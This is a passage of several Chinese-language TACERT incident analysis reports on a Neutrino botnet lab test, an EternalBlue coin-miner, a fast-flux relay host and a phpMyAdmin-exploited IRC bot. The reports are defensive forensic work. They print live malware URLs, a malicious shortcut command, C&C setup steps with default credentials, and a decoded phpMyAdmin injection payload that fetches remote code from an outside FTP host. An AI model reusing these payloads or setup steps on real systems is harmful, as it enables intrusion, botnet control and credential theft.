        "content": "個案分析- Neutrino 的殭屍主機與 C&C 伺服器事件分析報告 臺灣學術網路危機處理中心團隊(TACERT)製 106 年1 月  1 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team I. 事件簡介 1. 近幾年Neutrino Botnet 在網路上盛行,因該bot 能對主機進行多樣化 的攻擊而造成不小的威脅,。 2. 駭客組織將該惡意程式控制程式於網路上販售,散播並提供其他駭客使 用。 3. 本單位取得Neutrnio Botnet 的C&C 主機控制程式樣本,並以VM 主機進 行攻擊測試並側錄封包。 4. 該惡意程式主要分為 bot builder 和 C&C server 控制程式兩部分。 II. 事件檢測 1. 首先需要架構出一台C&C 主機環境,測試採用Win7(x64)系統並且安裝免 費的架站工具Wamp Server,以自動安裝Apache、PHP、Mysql 及PhpMyAdmin 等服務。 2. 將取得的Neutrino 惡意工具檔案解開後,會有Builder 和Server Side 兩部分的檔案,分別是用來產生bot 程式的惡意程式及C&C 主機所需要用 到的 php 控制程式。 3. 在Wamp Server 架設好之後,將資料夾 Neutrino Server Side 內的所有 檔案複製到 C:/wamp64/www/ ,因該C&C 的管理頁面是透過HTTP 的PHP 去控制。  2 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 4. 後續還需要進行安裝作業,透過瀏覽器連到server 的 install.php,會 開啟一個安裝頁面。此欄位分別輸入 DB host IP、DB name、DB user、 DB password 及說明檔中的 Secure Key。 5. Database 的欄位必須事前透過 PhpMyAdmin 自行建立名稱,供C&C 套件寫 入資料庫。 6. 在成功安裝後可以檢視到install.php 跳出的訊息,包含登入的路徑及認 證金鑰,以及預設的登入密碼皆為 admin,並提示將",
        "Page_Num": "1,2,3"
    },
    "177": {
        "File_Name": "個案分析-Neutrino 的殭屍主機與C&C伺服器事件分析報告_10601.pdf",
        "content": "install.php 刪除 delete 避免其他人存取利用。 7. 接著我們就能透過他提供的 Login page 連結 http://140.*.*.*/Neutrino/index.php?authkey=21232*******fc3 及  3 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 帳號密碼 admin:admin 登入C&C 主機。 8. 進入頁面後主要 task manager 是攻擊任務的執行狀況,Clinets 可以管 理所有連入的bot 狀態,Keylogger 是竊取bot 主機登入特定網站的帳號 密碼資訊。 9. 此時的C&C 是一台剛建立好的伺服器,因此尚未有bot 感染連入報到。因 此需要製作出一個會向該C&C 報到的惡意程式,就需要透過 neutrino builder 去產生出來。透過Virustotal 檢測為 4/56 比率的 Hacktool。  4 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 10. 開啟neutrino builder 的執行檔後,會要求輸入C&C 主機的網址,並 且為 neutrino/task.php 的檔案路徑,表示之後感染的bot 都會向 task.php 做報到。 11. 將build 的惡意程式 neutrino.exe 透過Virustotal 檢測比率為 44/56,大多判定為 backdoor 的後門程式。  5 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 12. 在架構好C&C 環境後,接著要透過builder 產生的惡意程式 neutrino.exe 去感染為殭屍主機,我們以Win7(x86)的VM 環境進行測試。 13. 將neutrino.exe 於系統執行後,透過procexp 觀察系統背景程式執行 狀況,確實產生一支新的惡意程式 winhelp.exe 於背景執行,只是該程 式並無建立一個通訊埠為Listening,也無明顯對外連線。 14. 該winhelp.exe 除了為隱藏檔之外,還特別是作業系統的隱藏檔,只顯 示一般隱藏功能還無法顯現出來。並經由virustotal 分析得知,同樣為 ",
        "Page_Num": "3,4,5,6"
    },
    "178": {
        "File_Name": "個案分析-Neutrino 的殭屍主機與C&C伺服器事件分析報告_10601.pdf",
        "content": "偵測比例為47/56 的木馬後門程式。  6 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 15. 透過TCPview 或 currport 工具去紀錄系統中背景程式的建立連線紀 錄,也觀察不出有任何可疑的回報連線,推斷該程式可能有修改系統程式 並隱藏惡意程式的連線狀況。 16. 此外該惡意後門程式會寫入註冊碼中並開機自動啟用。 17. 然而從C&C 控制端介面能夠看到感染的主機已經上線完成,並且會顯示 出BOT 的作業系統資訊及防毒軟體和IP 國別等資訊,確實能證明BOT 已 經遭受感染。 18. Task manager 是C&C 用來下達指令給BOT 的管理介面,主要常見的動 作有 Http(s) DDOS、Slowloris DDOS、TCP(UDP) DDOS、CMD shell、 Keylogger 和 下載並執行 等。其中 DDOS 的動作是比較容易被察覺,因 為會占用大量頻寬。  7 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 19. 實際測試一個UDP 的DDOS 去攻擊內部的主機,並觀察其C&C 指令發送 時的封包狀態分析。Command 的欄位為被攻擊者IP 及port 號和參數, status 綠色表示正在執行中,country 為欲發動攻擊bot 的國別,此例為 只要是位於TWN 的BOT 都會發動攻擊。 20. 同時間我們以Wireshark 側錄BOT 的網路封包觀察,發現該BOT 會以 HTTP POST 方式約每間隔280 秒向C&C 的task.php 發送封包,但是C&C 的回應都是顯示 HTTP/1.1 404 Not Found。  8 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 21. 仔細檢查session 封包內容,BOT 發送封包的content 中帶有感染主機 的資訊,為uid、OS 版本、antivirus 版本、bot 版本及連線quality",
        "Page_Num": "6,7,8,9"
    },
    "179": {
        "File_Name": "個案分析-Neutrino 的殭屍主機與C&C伺服器事件分析報告_10601.pdf",
        "content": "等 資訊。而C&C 回復的內容中有一段base64 code 「DEBUGMTQwMTA3NjM4NjcxNTc2NiNyYXRlIDUjDEBUG」,解碼後為 「DEBUG1401076386715766#rate 5#DEBUG」。此session 就是BOT 固定回 報的連線狀態。 22. 觀察BOT 端側錄封包,在C&C 下達攻擊指令後,會先將任務queue 在伺 服器端,等待BOT 下一次向C&C 向task.php 報到後,C&C 才將攻擊指令 放入content 回覆給BOT,不過C&C 一樣會在header 部分顯示 http/1.1 404 Not Found,讓使用者誤以為是回應失敗的。  9 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 23. 嘗試將C&C 回應內容的編碼以 base64 解碼,得知內容確實為C&C 的攻 擊指令參數,帶有被攻擊者IP 及port 等資訊。 24. 觀察BOT 的側錄封包,在BOT 從task.php 中接收到攻擊指令後,就會 開始進行UDP DDOS 攻擊,並且會以50 個thread 向受害者發動不定大小 封包的Flood 攻擊。 25. 以BOT 主機的TCPview 觀察攻擊時候狀態,因為惡意程式感染並修改系  10 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 統檔案,導致在系統內看不到被攻擊者IP,只知道當時確實正在對外進 行UDP flood 攻擊,而攻擊的惡意程式確實就是名為 winhelp.exe 的病 毒。 26. 從另一個角度來看C&C 接收指令狀況,當駭客向C&C 管理頁面下達攻擊 指令時,C&C 主機會收到來自駭客端的連線,並且以HTTP GET 方式並帶 有任務參數ID 及任務start 或stop,而C&C 確認cookie 的authkey 是 正確的後才會向BOT 發布攻擊指令。 27. 此BOT 惡意程式",
        "Page_Num": "9,10,11"
    },
    "180": {
        "File_Name": "個案分析-Neutrino 的殭屍主機與C&C伺服器事件分析報告_10601.pdf",
        "content": "還有個很高風險的功能,能夠輕易竊取使用者的登入網 站帳號密碼,將登入畫面截圖並記錄鍵盤輸入的資料,並且非常不易被察 覺出來。此例以關鍵字 Yahoo 做測試,指令為 keylogger 1 Yahoo。  11 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 28. 下載解壓 logs.rar 檔案後,裡面會有幾張圖檔和一個文字檔,文字檔 記錄了密碼的明文及瀏覽器資訊,而圖片為Yahoo 帳號ID 截圖。 29. 接著測試HTTP DDOS 攻擊,C&C 向BOT 發送控制命令,該命令以 base64 解碼後得知被攻擊者的IP 資訊,向受害者發動攻擊。 30. HTTP DDOS 攻擊很常被駭客用來癱瘓網站,因為除了發送HTTP request  12 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 外還需要建立TCP 三向交握的連線,向受害者發動攻擊。 31. 駭客登入C&C 管理介面後,在Statistics 頁籤中可以看到所有向該C&C 報到的BOT 數量統計,主要有OS 版本和國別資訊,以及online 或offline bots 數量。  13 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team III. 網路架構圖 C&C 伺服器 140.X.X.X:80 駭客 被攻擊網路設備 STEP 3 HTTP、TCP、UDP 等 DDOS攻擊 STEP 2 1.Bots 持續向C&C接收指令 2.使用Keylogger竊取bots帳密 STEP 1 HTTP 登入控制頁面 下達攻擊指令 殭屍電腦 Bots HTTP POST 1. 駭客透過HTTP 登入C&C 主機的指令控制頁面。 2. 受感染的殭屍電腦bots 會以定期HTTP POST 向C&C 回報並接收指令。 3. 殭屍電腦bots 的帳號密碼可能會被keylogger 側錄回傳給C&C。 4. 當Bots 收到C&C 的攻擊指令後,開始向特定主機發動DDOS 攻擊。。 IV. 建議與總結 1.",
        "Page_Num": "11,12,13,14"
    },
    "181": {
        "File_Name": "個案分析-Neutrino 的殭屍主機與C&C伺服器事件分析報告_10601.pdf",
        "content": "駭客透過 Builder 工具建立後門程式,並將C&C 網址寫入其中。 2. 通常C&C 位址會以動態網域名稱方式連線以規避追查。 3. 當主機感染成為bot 之後會開始每280 秒向C&C 主機HTTP POST 回報。 4. 此例bot 的惡意程式winhelp.exe 並不會建立Listening port 去等待C&C 或駭客連入,而是主動向C&C 請求控制命令。 5. C&C 回覆給bot 的攻擊指令會以 base64 方式編碼於HTTP reply 內容。 6. Neutrino bot 能夠進行多類型的DDOS 攻擊及側錄竊取bots 帳號密碼。 7. BOT 的後門程式會開機自動啟用,只要將之移除就能阻斷C&C 控制命令接 收。  14 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 8. 該惡意程式很容易被防毒軟體所偵測,故安裝防毒軟體避免感染成為殭屍 主機。 V. 國外相關報導 1. https://cleanupmalware.wordpress.com/tag/neutrino-bot/ 2. http://www.enigmasoftware.com/neutrinobot-removal/ 3. https://blog.malwarebytes.com/threat-analysis/2015/08/inside-neutrino-botn et-builder/ ",
        "Page_Num": "14,15"
    },
    "182": {
        "File_Name": "個案分析-NSA攻擊工具事件分析報告_10806.pdf",
        "content": "NSA 攻擊工具事件分析報告 臺灣學術網路危機處理中心團隊(TACERT)製 2019 年6 月  1 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 一、 事件簡介 1. 在2019/3 月底本中心發現在學術網路內從2019/3 起陸續有來自http:// 47[.]106[.]217[.]147/svchosa.exe 與http://m9f[.]oss-cn-beijing[.]aliyuncs[.]com /svchosa.exe (IP: 59.110.185.187)的惡意程式攻擊事件,該惡意程式名稱為 svchosa.exe,與系統檔svchost.exe 之名稱僅一個字母之差,為了解該惡意程 式的攻擊行為,本中心進行該程式的鑑識分析作業。 二、事件檢測 1. 首先,使用兩台在同一區域網路的Win 7 虛擬機(155 主機與137 主機)進行 svchosa.exe 檢測,並在155 主機(IP:192.168.195.155)上執行svchosa.exe。 2. 程式svchosa.exe 經Virustotal 檢測,其惡意比例為55/70,多家防毒軟體公司 以Downloader 或CoinMiner 命名它。  2 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 3. 檢視主機對外連線狀況,發現svchosa.exe 會連線中國IP:47.104.110.131:8090 與中國IP:47.106.217.147:80,它也會針對區域網路內各IP 進行兩個port 的掃 瞄(port scan:139port 與445port),而因執行svchosa.exe 產生的oysks.exe 會連 線新加坡IP:139.99.72.56:80 與日本IP:103.101.30.10:80。在svchosa.exe 執行 一段時間後,會發現svchostlong.exe 與serverlong.exe 會連線區域網路內137 主機的445port,而svchosa.exe 會在區域網路的portscan 作業結束後連線中國 IP:60.2.77.229:14",
        "Page_Num": "1,2,3"
    },
    "183": {
        "File_Name": "個案分析-NSA攻擊工具事件分析報告_10806.pdf",
        "content": "33。  3 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 4. 查看連線中國IP:47.106.217.147:80 之封包內容,發現它會下載SMB445.exe 與services.exe 兩程式至主機內。  4 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 5. 查看連線日本IP:103.101.30.10:80 與新加坡IP:139.99.72.56:80 之封包內容, 發現這兩個連線皆為向礦池報到來進行挖礦作業之連線行為。  5 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 6. 查看連線中國IP: 60.2.77.229:1433 之封包內容,發現在區域網路的portscan 作業結束後會透過1433 port 進行ms-sql 資料庫的連線。 7. 檢視背景程式運作情形,發現在svchosa.exe 執行後會循環式地執行 ipconfig.exe (清除DNS 快取)、taskkill.exe(強制結束ipconfig.exe)、oysks.exe(執 行挖礦)與taskkill.exe(強制結束oysks.exe)等程序,其中會在C:\\$aywke 產生 oysks.exe 來執行挖礦。  6 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 在執行上述程序一段時間後,會開始執行S.exe、PING.EXE (檢查TCP/IP)、 刪除S.exe、執行Svchostlong.exe、Serverlong.exe、Taskkill.exe (強制結束 oysks.exe)與刪除 C:\\ProgramData\\*.txt 等程序。  7 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 其中Svchostlong.exe(Eternalblue)與Serverlong.exe(Doublepulsar)執行後會在 C:\\ProgramData 產生IP address.txt 與IP address-dll.txt 兩個文字檔,例 如:192.168.195.137.txt 或192.168.195.137-dll.txt",
        "Page_Num": "3,4,5,6,7,8"
    },
    "184": {
        "File_Name": "個案分析-NSA攻擊工具事件分析報告_10806.pdf",
        "content": "。 在執行完svchostlong.exe 與serverlong.exe 後會刪除所有在C:\\ProgramData 資 料夾的*.txt 文字檔。 8. 查看IP address.txt 與IP address-dll.txt 兩個文字檔內容,發現它可能為程式 svchostlong.exe 與serverlong.exe 執行後的紀錄檔,但在整個svchosa.exe 執行 過程的最後程序裡這些紀錄檔將被刪除。  8 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 9. 檢視程式在主機開機後執行情形,發現svchosa.exe 會在主機重新開機後自動 執行,並且呼叫oysks.exe 來進行挖礦。 10. 查看oysks.exe 所在位置,發現它存放於C:\\一個隱藏式資料夾$aywke 中, 經Virustotal 檢測其惡意比例為31/70,多家防毒軟體公司以CoinMiner 命名 它,可以確認它為一個挖礦程式。  9 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 11. 查看區域網路內被駭入的主機受感染情形,發現它會在受感染主機之 C:\\programData 資料夾內存放services.exe、Svchostlong.exe、Serverlong.exe、 VNC.exe 與vbs.vbs 等檔案,而且會產生一個隱藏式的亂數命名的資料夾存放 挖礦程式,如:Fgols.exe 存於C:\\$gyomw\\內,也會依照vbs.vbs 內容去執行命 令下載惡意程式。 12. 本個案在執行svchosa.exe 後,所發現的惡意程式彙整如下表,其中VNC.exe 的檔案大小是0 KB,而Virustotal 檢測為0/58,無法檢測出其是否為惡意, 但在檢測時發現svchosa.exe 會在感染區域網路內其他主機時,透過vbs.vbs 的執行下載http://fuckyoupassword.top:20190/spread.exe,並將spread.exe 下載 至主機後存成c:\\ProgramData\\VN",
        "Page_Num": "8,9,10"
    },
    "185": {
        "File_Name": "個案分析-NSA攻擊工具事件分析報告_10806.pdf",
        "content": "C.EXE。 惡意程式名稱 所在位置 所在電腦 惡意程式功能 Virustotal Oysks.exe C:\\$aywke\\ 155 主機 挖礦程式 31/70 S.exe C:\\ProgramData\\ 155 主機 --- 執行過程中 被刪除,無 檔案可檢測 Svchostlong.exe C:\\ProgramData\\ 155 主機 137 主機 EternalBlue 59/70 Serverlong.exe C:\\ProgramData\\ 155 主機 137 主機 DoublePulsar 60/70 VNC.exe C:\\ProgramData\\ 137 主機 檔案0 KB 0/58 檢測不出 Services.exe C:\\ProgramData\\ 137 主機 Downloader CoinMiner Backdoor 56/71  10 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 惡意程式名稱 所在位置 所在電腦 惡意程式功能 Virustotal Vbs.vbs C:\\ProgramData\\ 137 主機 VBS Downloader 6/56 Fgols.exe C:\\ProgramData\\ 137 主機 挖礦程式 19/69 三、事件攻擊行為示意圖 1.從惡意網站感染與下載惡意程式。 2.執行svchosa.exe。 (1)執行ipconfig.exe 清除DNS 快取。 (2)強制結束ipconfig.exe。 (3)執行oysks.exe 進行挖礦。 (4)執行taskkill.exe 結束oysks.exe。 (5)執行S.exe。 (6)執行Ping.exe 檢查TCP/IP。 (7)刪除S.exe。 (8)執行Svchostlong.exe。 (9)執行serverlong.exe。  11 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team (10)執行taskkill.exe 結束oysks.exe。 (11)刪除C:\\programData\\*.txt。 3.連線中國IP:47.104.110.131:8090。 4.對區域網路內各主機進行139port 與445 port 的Port Scan 作業。 5.連線新加坡IP:139.99.72.56:80 與日本IP:103.101.30.10:80 兩個礦池進行挖礦作 業。 6.連線中國IP:47.106.217.147:80 下載SMB445.exe 與Services",
        "Page_Num": "10,11,12"
    },
    "186": {
        "File_Name": "個案分析-NSA攻擊工具事件分析報告_10806.pdf",
        "content": ".exe。 7.連線中國IP:60.2.77.229:1433 來進行ms-sql 資料庫連線。 四、建議與總結 1. 本個案的攻擊手法是透過惡意程式svchosa.exe 感染受害主機後,該主機 會使用美國國安局(NSA)外洩的著名攻擊工具EternalBlue(Svchostlong.exe) 與DoublePulsar (Serverlong.exe)來攻擊區域網路內含有SMB 漏洞的主機。 2. Svchosa.exe 會在受害主機之C:\\建立一個含有挖擴程式的隱藏資料夾,來 進行挖礦,而其資料夾命名與挖礦程式的檔案命名皆是亂數命名,不固定 資料夾名稱與檔案名稱。 3. 區域網路內受感染的主機會執行惡意的VBScripts 來下載惡意程式,並且 執行隱藏的挖擴程式。 4. 檢視本個案之情況,有下列幾點建議措施提供參考。 (1) 修補Windows 系統SMB 服務漏洞。 (2) 將駭客常使用來攻擊的port 鎖住,如445 port。 (3) 不隨意開啟不明來源的網頁、信件或檔案。 (4) 定期進行系統與病毒碼更新作業。 (5) 定期進行系統掃毒作業。 ",
        "Page_Num": "12"
    },
    "187": {
        "File_Name": "個案分析-N大學受感染的中繼站主機事件分析報告_10408.pdf",
        "content": "1 個案分析- N 大學受感染的中繼站主機 事件分析報告 TACERT 臺灣學術網路危機處理中心團隊製 2015/8  2 I. 事件簡介 1. 該大學某主機被行政院技服中心偵測到有中繼站惡意連線行為,並偕同 本單位協助進行處裡。 2. 該主機為一台作業系統Win7 的實驗用虛擬機器。 3. 該主機會占用大量的網路頻寬,並且被偵測到有惡意網域名稱對應到該 主機IP。 4. 本單位偕同技服中心針對該主機進行封包側錄並數位鑑識。 II. 事件檢測 1. 首先檢測該主機的網路連線行為是否異常,透過 tcpview 工具可以看 到,有一支PID 為0 的未知程式和mobile7.exe 產生大量的對外網路連 線,並且都是連到外部IP 的網站通訊埠port 80。 2. 此外mobile7.exe 的程式開啟了本地通訊埠,分別是TCP port 80 和 UDP port 53 進行監聽接收。 3. 使用procexp 工具來檢視所有背景程式的執行狀態,發現該程式 mobile7.exe 確實正在執行中,並且沒有顯示明確的 Description 和 Company Name,研判應為惡意程式。  3 4. 檢視mobile7.exe 程式的網路狀態,可以看到該程式正在發送封包至外 部IP 主機,並且開啟port 80 和53 為Listening 狀態。 5. 實地檢查該檔案的位置資料夾,發現到該檔案為隱藏的執行檔,因此若 無開啟顯示隱藏檔選項則不易發現其存在。 6. 通常惡意程式會伴隨該機自動啟動,因此透過autoruns 工具檢查是否異 常,的確出現一個名為 CrashReportSaver 的開機啟動註冊碼,路徑名 稱就為 mobile7.exe 所有。  4 7. 透過隨身碟插入測試是否會感染外接USB 裝置,發現惡意程式的確會植 入到隨身碟根目錄中,產生1.03MB 的隱藏檔click.exe。 8. 值得注意的是隨身碟內所有的資料夾都會被惡意程式改成隱藏資料夾, 而會另外產生相同資料夾名稱的捷徑,這些捷徑通通",
        "Page_Num": "1,2,3,4"
    },
    "188": {
        "File_Name": "個案分析-N大學受感染的中繼站主機事件分析報告_10408.pdf",
        "content": "指向 click.exe 執 行。 1. 捷徑內容為「C:\\WINDOWS\\system32\\cmd.exe F/c \"start %cd%\\click.exe && %windir%\\explorer %cd%\\sources\"」。 2. 一旦不注意開啟偽裝資料夾,就會執行到惡意程式。 9. 透過Virustotal 線上掃描 mobile7.exe 和 click.exe 發現,其實就是 完全相同的惡意程式,且相當高的偵測率為 29/57 的木馬程式。  5 10. 檢測網路封包觀察其網路行為,觀察到此主機有開啟port 53 去接收外 部主機的封包,確實為DNS 伺服器功能,專門用來解析其他惡意網域名 稱。從紀錄來看至少有600 個惡意網址的解析紀錄,依查詢排名前幾名 為「bayermun.biz、gorodkoff.com、demyator.biz、mydear.name、 www.mydear.name 」等。 11. 這些惡意網址透過Virustotal 掃描,偵測出的比率其實很低或者是零。 12. 以上這些網址透過DNS 解析出來的IP 每個時間點都不同,所以產生一個 網址對應至多個IP 現象,表示駭客透過Fast Flux 技術快速切換中繼站  6 網域名稱的IP 位址,以提高中繼站存活的機會。 13. 從另一角度觀察網域名稱與IP 關係,由於也有許多惡意網域名稱對應到 單一感染主機140.X.X.116,表示此中繼站群是透過 Double-Flux 技術 雙向切換,更不易被相關單位追查發現,屬於大型的殭屍網路活動。 14. 觀察該中繼站網路行為,底層的殭屍電腦會向該中繼站的port 80 發送 封包,而中繼站則將收到封包中繼至遠端的SMTP 伺服器,封包內容為登 入SMTP 伺服器郵件帳號後,透過該帳號向外發送惡意釣魚郵件,故中繼 站成為殭屍電腦的proxy 伺服器去登入遠端郵件伺服器。藉由此方式單 從郵件伺服器",
        "Page_Num": "4,5,6"
    },
    "189": {
        "File_Name": "個案分析-N大學受感染的中繼站主機事件分析報告_10408.pdf",
        "content": "紀錄來看就無法追查到底層殭屍電腦位址。 1. 從下圖舉例可知,底層殭屍電腦83.149.125.142 發送封包給中繼站 的port 80,中繼站則再向上層SMTP 伺服器84.2.46.3 進行帳號登 入並發送惡意電子郵件。  7 2. 檢視底層殭屍電腦83.149.125.142 發送至中繼站的封包內容,包含 了加密過的帳號密碼,以及誘使他人開啟的惡意網址連結。 3. 檢視中繼站發送至SMTP 伺服器208.84.244.49 的封包內容,其內容 與殭屍電腦發送至中繼站內容一樣,都包含帳號密碼以及惡意網址。  8 4. 從封包記錄上來看,約有900 個相異的SMTP 伺服器被中繼站嘗試登 入帳號密碼發送惡意釣魚郵件。 15. 除此之外中繼站也被殭屍電腦用來登入遠端的FTP 伺服器,例如殭屍 電腦176.103.48.27 透過中繼站的port 80 發送登入封包至FTP 伺服器 91.121.6.54:21,封包內容中包含了明文的FTP 帳號和密碼,以及FTP server 的IP 資訊,並透過此帳號密碼測試確實能登入該FTP 伺服器。  9 16. 除此之外中繼站也會用來傳送EXE 執行檔,大多殭屍主機會透過 fast-flux 網域名稱 gorodkoff.com 連到中繼站,再透過中繼站向上層 主機下載惡意程式執行檔,這些上層主機有 176.103.55.73、 176.103.54.73、89.144.2.115、89.144.2.119 共四個。 1. 然而底層主機62.210.239.195 直接連到中繼站IP 而非網域名稱,向 上層主機176.103.54.73 登入帳號密碼「infected:infected」來下 載 惡意程式cclub02.exe,研判62.210.239.195 可能是上層駭客所 用的IP。 2. 經外部檢測該惡意程式的主機176.103.54",
        "Page_Num": "6,7,8,9"
    },
    "190": {
        "File_Name": "個案分析-N大學受感染的中繼站主機事件分析報告_10408.pdf",
        "content": ".73 位於烏克蘭,使用 linux 系統並有開啟port 80 作為中繼站使用。  10 3. 從中繼站到上層主機176.103.54.73 的封包中,會帶有底層主機的 IP 資訊 (X-My-Real-IP: 62.210.239.195),用來讓中繼站能夠正確 將檔案cclub02.exe 回覆給來源端。該檔案大小約為1.06MB 的惡意 程式,透過Virustotal 的檢測比例為 13/56。  11 4. 封包紀錄中側錄到的惡意程式有以下10 個檔案,雖然檔案名稱不同 但應該皆為相同作用的惡意程式。 III. 網路架構圖 惡意程式主機 176.103.54.73:80 176.103.55.73:80 89.144.2.115:80 89.144.2.119:80 殭屍主機 demyator.biz mydear.name gorodkoff.com 95.180.21.55 109.87.233.72 86.107.19.225 ... Double Fast Flux bayermun.biz ... 172.88.54.165 85.186.246.132 77.122.234.122 ... 殭屍主機 SMTP servers 208.84.244.49:25 ... 郵件收件者 STEP 2-3 發送惡意郵件 STEP 2-2 郵件中繼 STEP 2-1 SMTP Login FTP servers 91.121.6.54:21 ... STEP 3-1 FTP Login STEP 3-2 FTP Login 殭屍主機 STEP 1 DNS query STEP 4-2 下載惡意EXE檔案 STEP 4-1 下載惡意EXE檔案 1. 殭屍主機會向中繼站群發送DNS query 封包,因此中繼站為DNS Proxy Servers。 2. 殭屍主機透過中繼站群登入遠端SMTP 郵件伺服器,並且發送惡意郵件給其 他使用者。 3. 殭屍主機也會透過中繼站群登入遠端FTP 伺服器,上傳或竊取FTP 伺服器  12 的資料。 4. 殭屍主機也會透過中繼站群向惡意檔案伺服器下載惡意EXE 檔案,讓惡意 程式在擴散出去。 5. 殭屍主機與中繼站間的",
        "Page_Num": "9,10,11,12"
    },
    "191": {
        "File_Name": "個案分析-N大學受感染的中繼站主機事件分析報告_10408.pdf",
        "content": "連接方式大多是透過惡意網域名稱連接,因此每次 建立連線都可能是不同的中繼站。 IV. 建議與總結 1. 此事件是一個跨國際的大型中繼站殭屍網路,駭客使用 double Fast Flux 技術變換中繼站的網域名稱及IP 位址,且至少有600 個以上惡意 網域名稱再做切換。 2. 主機感染後惡意程式 mobile7.exe 會開啟TCP port 80 進行中繼站資 料傳送,開啟 UDP port 53 作為DNS proxy server,並寫入開機註冊碼 中自動執行,主機的相關帳號密碼可能會外洩。 3. 透過TCP port 80 進行的網路行為有 SMTP relay、 FTP relay 以及 HTTP 的惡意EXE 程式下載。 4. 殭屍主機能夠登入外部的SMTP 或FTP 伺服器,可能是因為感染病毒後帳 號密碼被竊取,被駭客利用來發送郵件或竊取FTP 檔案。 5. 此病毒感染方式通常會透過惡意電子郵件或者隨身碟交叉感染,隨身碟 一旦插入感染主機,內部自動會產生隱藏病毒檔,並置換資料夾為惡意 捷徑,易使人上當執行。 6. 電子郵件和隨身碟開啟前務必檢查有無可疑之處,避免誤觸惡意程式。 7. 感染此病毒後網路頻寬會被大量使用,只要透過 tcpview 和procexp 工 具就能找出惡意程式位置並且將之移除,並立刻更換常用的帳號密碼。 ",
        "Page_Num": "12"
    },
    "192": {
        "File_Name": "個案分析-N大學的異常IRC連線主機事件分析報告_10401.pdf",
        "content": "1 個案分析- N 大學的異常IRC 連線主 機事件分析報告 TACERT 臺灣學術網路危機處理中心團隊製 2015/1  2 I. 事件簡介 A. 2014 年底該校接獲EWA 預警資安事件單,並請本單位進行協助鑑識該主 機的感染行為。 B. 因為該主機為實驗用的VM 虛擬機,並且安裝的是Linux Centos 系統, 故本單位透過SSH 方式遠端登入協助。 C. 該主機明顯特徵為持續對外有IRC 連線行為,並且占用極大的網路頻寬 流量。 II. 事件檢測 A. 首先檢查網路通訊埠的使用情形,透過 netstat 指令得知 port 80 有 開啟,process ID 為 httpd。 Proto Local Address Foreign Address State PID/Program tcp 0.0.0.0:22 0.0.0.0:* LISTEN 1049/sshd tcp 0.0.0.0:3306 0.0.0.0:* LISTEN 1248/mysqld tcp :::80 :::* LISTEN 1350/httpd tcp :::22 :::* LISTEN 1049/sshd tcp :::23 :::* LISTEN 1057/xinetd B. 因為系統裝有Apache 和舊版的phpmyadmin 套件,故嘗試輸入網址 http://163.X.X.43/phpMyAdmin/scripts/setup.php 後出現含有漏洞的  3 php 管理頁面。 C. 檢查登入的Access Log,發現先前的紀錄似乎都被駭客移除,讓使用者 查不到可疑IP。 D. 此時再查看可疑IP 連線,果然發現 httpd 的程式與外部IP 建立port 6667 的IRC 連線,基本上httpd 應不會主動對特定埠號建立連線,而是 處於被動 Listen 的狀態才正常。 Proto Local Address Foreign Address State PID/Program tcp 163.X.X.43:40084 89.248.172.240:6667 ESTABLISHED 1365/httpd E. 經檢查得知該IP 89.248.172.240 位於紐西蘭。 F. 從側錄的封包中得知,首先駭客透過紐西蘭主機93.174.93.149 向本地 受害主機",
        "Page_Num": "1,2,3"
    },
    "193": {
        "File_Name": "個案分析-N大學的異常IRC連線主機事件分析報告_10401.pdf",
        "content": "163.X.X.43 的網頁漏洞 /phpMyAdmin/scripts/setup.php 進 行 HTTP POST 寫入動作。 G. 從93.174.93.149 利用漏洞寫入的內容為URL 的編碼方式,透過URL  4 Decoder 解碼後可以得到明文為: 1. configuration=a:1:{i:0;O:10:\"PMA_Config\":1:{s:6:\"source%22;s :31:\"ftp://37.59.68.12/pub/col4d.php\";}}。 2. 以上為指令該主機透過FTP 方式連到英國IP 37.59.68.12 下載並執 行惡意程式col4d.php。 3. 檢查主機連到37.59.68.12 的封包檔案,因為傳遞過程是透過一般 FTP 協定,其封包內容為明文無加密,可以清楚看到帳號和密碼皆為 anonymous,且下載檔案的確為 col4d.php 的惡意程式。 4. 嘗試使用查到的帳號密碼登入該FTP 主機,內部放有許多駭客使用的 php 或偽裝成png 格式的惡意程式指令檔,檔案數量約為40 個。其 中還有偽裝成PNG 圖片檔的惡意執行檔案。 5. 檢視col4d.php 的程式碼內容,程式碼開頭就直接帶出特定IP 和  5 port,表示受害主機確實會向上層IP 位址89.248.172.240 的port 6667 進行IRC 報到連線。 6. 除此之外該程式碼中帶有特定攻擊指令的函數,能讓IRC server 89.248.172.240 下達命令使感染的主機對外發動攻擊,如UDP_flood 或HTTP_flood 等。 H. 此感染主機還會持續地向特定網域名稱進行連線,主要是透過HTTP GET 方式向「corepillar.com」和「freegeoip.net」的網站連線,此兩網域 可能採用Fast Flux 方式不斷切換對應到的IP。 1. 當時「corepillar.com」解析出的IP 為歐洲的摩爾多瓦 178.175.",
        "Page_Num": "3,4,5"
    },
    "194": {
        "File_Name": "個案分析-N大學的異常IRC連線主機事件分析報告_10401.pdf",
